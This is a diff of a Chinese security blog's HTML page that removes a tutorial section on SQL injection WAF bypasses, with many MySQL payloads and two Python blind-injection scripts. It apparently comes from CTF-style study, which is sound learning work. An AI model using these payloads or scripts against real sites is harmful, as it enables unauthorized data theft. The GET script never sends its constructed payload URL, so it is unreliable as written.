-<li><code>/*!50000 */</code><br>表示mysql是5.00.00以上的版本时,注释符里的内容才会被执行,可以将感叹号后面的数字改成一个很大的不存在的版本,这样注释里的语句就不会执行</li>
-</ol>
-<h2 id="空白符"><a href="#空白符" class="headerlink" title="空白符"></a>空白符</h2><p>原理:在关键字符中插入,一个注释符后面加上一个任意字符和换行符,如<code>select --+a%0A union</code>让防火墙误以为select后面是字符a,实际上a被注释后换行,union不受影响</p>
-<h2 id="and和or替换"><a href="#and和or替换" class="headerlink" title="and和or替换"></a>and和or替换</h2><ol>
-<li><code>&amp;&amp;</code>和<code>||</code>进行替换</li>
-<li>使用异或<br> 简单来说异或就是同真同假为0,不同为1<br> <code>?id=1^1^0</code>  可以替换<code>?id=1 and 1=2</code>的功能<br> <code>?id=1^1^1</code>  可以替换<code>?id=1 and 1=1</code>的功能<br> 注意,布尔盲注也可以用异或来代替and,在<code>if()</code>被禁用时,似乎是个不错的选择(闭合为整数型)<br> <code>?id=1^1^(ascii(substr((select(database())),1,1))&gt;100)</code></li>
-<li>使用真假判断<br> <code>?id=1 &amp;&amp; ture</code>   如果过滤了and后面接数字的情况,可以替换<code>?id=1 and 1=1</code>的功能<br> <code>?id=1 &amp;&amp; false</code>   如果过滤了and后面接数字的情况,可以替换<code>?id=1 and 1=2</code>的功能</li>
-</ol>
-<h2 id="group-by替换order-by"><a href="#group-by替换order-by" class="headerlink" title="group by替换order by"></a>group by替换order by</h2><p><code>order by</code>在很多情况下更好用,但是相对防火墙的限制也更严格</p>
-<h2 id="information-schema-tables替换"><a href="#information-schema-tables替换" class="headerlink" title="information_schema.tables替换"></a>information_schema.tables替换</h2><p>如果 <code>information_schema</code>被过滤了的话,里面有两个关键数据表就无法读取<code>tables</code>和<code>columns</code></p>
-<ol>
-<li><p><code>table_schema</code>不变<br> <code>sys.schema_table_statistics_with_buffer</code><br> <code>sys.x$ps_schema_table_statistics_io</code></p>
-</li>
-<li><p><code>table_schema</code>替换成<code>database_name</code><br> <code>mysql.innodb_table_stats</code>  <code>mysql.innodb_table_index</code></p>
-</li>
-</ol>
-<h2 id="join法获取列名-information-schema-columns替换"><a href="#join法获取列名-information-schema-columns替换" class="headerlink" title="join法获取列名(information_schema.columns替换)"></a>join法获取列名(information_schema.columns替换)</h2><ol>
-<li><strong>前提</strong>:页面必须存在报错回显</li>
-<li><strong>语法</strong><br><code>union select * from(select*from 爆出的表名 as a join 同一个表名 as b)c</code><br>这时候会显示出第一个表名,使用<code>using()</code>函数逐渐加入爆出来的字段,获得下一个字段<br><code>union select * from(select*from 爆出的表名 as a join 同一个表名 as b using(第一个列名,第二个列名...))c</code></li>
-</ol>
-<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><ol>
-<li><strong>获取数据</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 爆破出的表名)k),<span class="number">3</span></span><br></pre></td></tr></table></figure></li>
-<li><strong>原理</strong><br>和之前的密码绕过一样,这里利用到的是union查询时会将两张表中的数据合并<strong>创建虚拟表</strong>的特性<br><code>select 1,2,3 as b union select * from 爆破出的表名</code><br>这句话的作用就是创建一个如下的虚拟表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+----+--------+---------+</span><br><span class="line">| 1  | 2      | 3别名(b)|</span><br><span class="line">+----+--------+---------+</span><br><span class="line">|  1 | 2      | 3       |</span><br><span class="line">|  1 | zzzz   | mmmm    |</span><br><span class="line">|  2 | admin  | admin   |</span><br><span class="line">|  3 | admin1 | admin1  |</span><br><span class="line">+----+--------+---------+</span><br><span class="line">可以发现这样一来已经不需要知道原来的表名了,只需要把这个当做新表查询即可</span><br></pre></td></tr></table></figure>
-因为是新创建的表写在前面,原来的表写在后面,如果反过来,是不是就是在原来的表中增加数据了呢,就可以实现密码绕过了</li>
-<li><strong>注意</strong><br><code>select 1,2,3 as b</code>需要逐步尝试列数,as是取别名,最后用取的别名来代替原来的名称</li>
-</ol>
-<h2 id="mysql-8-0-select绕过"><a href="#mysql-8-0-select绕过" class="headerlink" title="mysql 8.0+ select绕过"></a>mysql 8.0+ select绕过</h2><ol>
-<li><p><strong>适用于什么情况</strong><br>如果select关键词被完全过滤,且不存在堆叠注入的情况下,一般情况下是无法进行SQL注入的<br>但是<code>mysql 8.0.19</code>的版本增加了一些新特性,可以利用这些新语法在不使用select的情况下也能进行查询</p>
-</li>
-<li><p><strong>TABLE</strong><br><code>table</code>列出表的所有内容，类似于SELECT,支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。<br><code>TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code><br>需要注意的是 1. table始终显示表的所有列(<code>table user</code>&#x3D;<code>select * from user</code>) 2. 不允许有WHERE子句</p>
-</li>
-<li><p><strong>VALUES</strong><br><code>VALUES</code>列出一行的值。<br><code>ROW()</code>返回的是一个行数据，VALUES和ROW()配合使用,返回的行数据加上字段整理为一个表<br>我们可以利用这个特性用values来判断当前语句表列数以及是否有回显<br><code>union values row(1,2,3,...)#</code><br>如果原表中的列数与<code>row()</code>中的数字数不同时,就会报错</p>
-</li>
-<li><p><strong>盲注</strong><br>由上面的知识可以知道,table查询的表代表的是所有列,如果要使用table进行union联合查询的话,必须要table查询的表和原来语句中的表的列数是相同的,不能像select联合查询那么自由,所以很多时候,我们只能用盲注来获取想要的数据<br>学到的一种新的无列名盲注<br><code> or (1,&#39;Tom&#39;,&#39;123&#39;) &lt;= (table user limit 0,1)#</code><br>实质上这个语句是<code>table user limit 0,1</code>查询user表中的第一行,与另一个我们自己列出的数据进行大于等于<code>&lt;=</code>的比较，比较顺序为自左向右(一个字符一个字符比较)，第一列(也就是第一个引号内的数据<code>&#39;Tom&#39;</code>)判断正确再判断第二列(也就是第二个引号内<code>&#39;123&#39;</code>)。<br><strong>ps:当然这个例子中实际上的第一列应该是id,整数型的1,一般情况下都是如此</strong><br>采用这种方式进行比较盲注的话,列数就可以由自己控制了,我们只需要一个字符一个字符,一列一列的慢慢进行比较即可盲注出结果(前提是可以盲注)<br>给个python脚本,虽然写的比较烂,这个是POST脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = <span class="number">150</span></span><br><span class="line">mid = (left + right) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right):</span><br><span class="line">    a=<span class="built_in">chr</span>(mid)</span><br><span class="line">    date = &#123;</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="comment"># post要提交的pyload,每次输出的结果都要手动再加上去,才能判断下一个,每次判断的数据就是&#123;a&#125;的位置,判断完了第一行再把limit的数值改改</span></span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;a&#x27;or 1=((1,&#x27;<span class="subst">&#123;a&#125;</span>&#x27;,&#x27;&#x27;) &lt;= (table 要查询的表 limit 0,1))#&quot;</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment">#二分法判断</span></span><br><span class="line">        left = mid+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = <span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(table)  <span class="comment">#打印出来的最后一个字符才是表中的字符</span></span><br></pre></td></tr></table></figure>
-<p>GET脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 真值条件</span></span><br><span class="line">bihe = <span class="string">&quot;?id=1&#x27;&quot;</span>  <span class="comment"># 判断闭合方式</span></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = <span class="number">150</span></span><br><span class="line">mid = (left + right) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right):</span><br><span class="line">    a = <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="comment"># get提交的pyload,每次输出的结果都要手动再加上去,才能判断下一个,每次判断的数据就是&#123;a&#125;的位置,判断完了第一行再把limit的数值改改</span></span><br><span class="line">    payload = <span class="string">f&quot;or 1=((1,&#x27;<span class="subst">&#123;a&#125;</span>&#x27;,&#x27;&#x27;) &lt;= (table 要查询的表 limit 0,1))%23&quot;</span></span><br><span class="line">    new_url = url + bihe + payload</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=url).text:  <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">        left = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        right = mid</span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = <span class="built_in">chr</span>(mid - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(table) <span class="comment">#打印出来的最后一个字符才是表中的字符</span></span><br></pre></td></tr></table></figure></li>
-<li><p><strong>注意注意!!!</strong><br>盲注这个方法不知道是因为我的题目环境原因还是因为mysql本身的原因,表中的有些字符是无法进行大小的比较的,所有也就无法成功盲注出结果<br>比如坑死我的<code>admin_pass</code>,<code>_</code>字符无法进行比较,所以跑不出来<code>_</code>,暂时还不知道怎么解决,可能这种情况就不适用与盲注</p>
-</li>
-</ol>
-<h2 id="超大数据包post绕过"><a href="#超大数据包post绕过" class="headerlink" title="超大数据包post绕过"></a>超大数据包post绕过</h2><p>有些waf只检查前面的n个字符,这时候我们可以在查询语句中插入一个超大的无用数据,并用<code>/* */</code>注释掉,注意,这种方式只适用于post传参,如果不确定需要多少字符才能绕过waf,也可以写个python脚本跑一下</p>
-<h2 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h2><p>bp下载一个插件<img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230402222253.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1796,20 +1683,20 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1846,13 +1733,13 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">75k</span>
+    <span title="站点总字数">77k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:29</span>
+    <span title="站点阅读时长">4:36</span>
 </div>
 
 <!--
